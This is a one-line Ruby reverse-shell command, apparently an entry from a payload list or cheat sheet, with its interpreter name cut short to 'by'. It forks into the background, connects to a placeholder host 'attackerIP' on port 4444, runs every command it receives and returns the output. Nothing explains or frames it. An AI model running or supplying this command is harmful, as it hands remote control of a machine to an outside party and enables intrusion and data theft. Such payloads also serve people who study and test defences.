by -rsocket -e 'exit if fork;c=TCPSocket.new("attackerIP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
